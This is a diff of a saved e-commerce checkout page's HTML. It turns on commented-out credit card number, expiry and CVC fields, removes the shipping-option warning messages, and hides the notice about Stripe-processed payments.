@@ -975,8 +975,7 @@
 
 
                                     <!-- Ship to Billing Address -->
-                                    <div id="ship-to-billing" class="check-element active">
-                                        Shipping Address same as Billing
+                                    <div id="ship-to-billing" class="check-element active">                                        Shipping Address same as Billing
                                     </div>
                                     <!-- <input name="shipToBilling" value="true" type="hidden"> -->
 
@@ -1119,38 +1118,7 @@
                                     <!-- Shipping Options -->
                                     <div id="shipping-options">
                                         <div class="yui3-widget sqs-widget sqs-checkout-form-shipping-options">
-                                            <div class="sqs-checkout-form-shipping-options-content empty">
-                                                <div class="empty-message">
-                                                    You cannot continue checkout because this store has not configured any shipping options for your country.
-                                                </div>
-
-                                                <div class="warning-message zip-warning-message">
-                                                    <img src="/img/tiny-alert.png">Shipping options require your zip/postal code to estimate.
-                                                </div>
-
-                                                <div class="warning-message zip-invalid-warning-message">
-                                                    <img src="/img/tiny-alert.png">The zip code you entered is not valid.
-                                                </div>
-
-                                                <div class="warning-message weight-missing-warning-message">
-                                                    <img src="/img/tiny-alert.png">All products in this cart are missing weight information.
-                                                </div>
-
-                                                <div class="warning-message service-unavailable-warning-message">
-                                                    <img src="/img/tiny-alert.png">A method is unavailable for some items due to size restrictions.
-                                                </div>
-
-                                                <div class="warning-message carrier-warning-message">
-                                                    <img src="/img/tiny-alert.png">Something went wrong reaching the shipping carrier for estimates.
-                                                </div>
-
-                                                <div class="loading-spinner">
-                                                    <div class="yui3-widget sqs-spin dark" style="height: 15px; width: 15px;">
-                                                        <div class="sqs-spin-content yui3-widget-content-expanded"></div>
-                                                    </div>
-                                                </div>
-                                                <div class="options-container"></div>
-                                            </div>
+                                          
                                         </div>
                                     </div>
 
@@ -1178,7 +1146,7 @@
                                     Secure Payment
                                 </div>
 
-                                <fieldset>
+                                <fieldset style="display:block;">
 
 
                                     <!-- Credit Card -->
@@ -1186,13 +1154,13 @@
 
 
                                         <!-- Name -->
-                                        <!-- <input name="cardHolderName" type="hidden"> -->
+                                        <input name="cardHolderName" type="hidden">
 
 
                                         <!-- Card Number -->
                                         <div id="card-number" data-label="Card Number" class="field required">
                                             <label>Card Number</label>
-                                            <!-- <input class="field-element pulse-warnable" type="text" size="20" autocomplete="off" placeholder="Credit Card Number" value="">-->
+                                            <input class="field-element pulse-warnable" type="text" size="20" autocomplete="off" placeholder="Credit Card Number" value="">
                                         </div>
 
 
@@ -1202,7 +1170,7 @@
                                             <!-- Expiry Month -->
                                             <div id="card-expiry-month" data-label="Exp. Mo." class="field required">
                                                 <label>Exp. Mo.</label>
-                                                <!-- <select class="field-element pulse-warnable" value="04">
+                                                <select class="field-element pulse-warnable" value="04">
                                                     <option value="1">01</option>
                                                     <option value="2">02</option>
                                                     <option value="3">03</option>
@@ -1215,13 +1183,13 @@
                                                     <option value="10">10</option>
                                                     <option value="11">11</option>
                                                     <option value="12">12</option>
-                                                </select> -->
+                                                </select>
                                             </div>
 
                                             <!-- Expiry Year -->
                                             <div id="card-expiry-year" data-label="Exp. Yr." class="field required">
                                                 <label>Exp. Yr.</label>
-                                                <!--<select class="field-element pulse-warnable" value="2015">
+                                                <select class="field-element pulse-warnable" value="2015">
                                                     <option value="2014">2014</option>
                                                     <option value="2015">2015</option>
                                                     <option value="2016">2016</option>
@@ -1232,13 +1200,13 @@
                                                     <option value="2021">2021</option>
                                                     <option value="2022">2022</option>
                                                     <option value="2023">2023</option>
-                                                </select> -->
+                                                </select>
                                             </div>
 
                                             <!-- CVC -->
                                             <div id="cvc" data-label="CVC" class="field required">
                                                 <label>CVC</label>
-                                                <!-- <input class="field-element pulse-warnable" type="text" size="4" autocomplete="off" placeholder="CVC" value="">-->
+                                                <input class="field-element pulse-warnable" type="text" size="4" autocomplete="off" placeholder="CVC" value="">
                                             </div>
 
                                         </div>
@@ -1248,7 +1216,7 @@
 
 
                                     <!-- Secure payment conditions -->
-                                    <div id="comfort">
+                                    <div id="comfort" style="display:none;">
                                         All transactions are secure and encrypted, and we never store your credit card information. Payments are processed through Stripe. Payment information is also governed by
                                         <a target="_blank" href="https://stripe.com/privacy">Stripe's privacy policy</a>.
                                     </div>
